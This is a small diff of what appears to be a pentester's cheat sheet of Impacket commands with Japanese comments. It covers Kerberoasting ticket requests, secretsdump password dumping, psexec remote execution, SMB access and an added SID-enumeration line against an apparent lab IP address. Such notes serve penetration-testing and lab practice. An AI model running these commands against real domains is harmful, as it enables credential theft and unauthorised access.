@@ -15,5 +15,5 @@ impacket-GetUserSPNs <domain name>/<user>:<pass> -dc-ip <IP> -request #TGSを入
 impacket-secretsdump <domain>/<user>:<pass>@<IP> #ドメイン情報からパスワードダンプ
 impacket-psexec <domain>/<user>:<pass>@<IP> #impacket版psexec
 impacket-smbclient -k <domain>/<user>:<pass>@<dc name> -dc-ip <IP> #SMBに接続
-
+impacket-lookupsid <user>@10.129.253.69 -no-pass #SIDの列挙
 
